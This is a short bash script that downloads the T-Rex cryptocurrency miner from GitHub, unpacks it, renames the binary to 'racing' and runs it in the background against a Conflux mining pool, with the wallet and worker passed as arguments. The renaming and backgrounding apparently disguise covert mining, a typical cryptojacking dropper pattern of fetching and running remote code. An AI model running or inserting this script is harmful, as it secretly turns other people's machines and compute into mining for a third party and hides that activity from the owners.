#!/bin/bash
cd /home
wget https://github.com/trexminer/T-Rex/releases/download/0.26.5/t-rex-0.26.5-linux.tar.gz
tar xvzf t-rex-0.26.5-linux.tar.gz
mv t-rex racing
./racing octopus -o stratum+tcp://cfx.woolypooly.com:3094 $1.$2 -p 123456 &
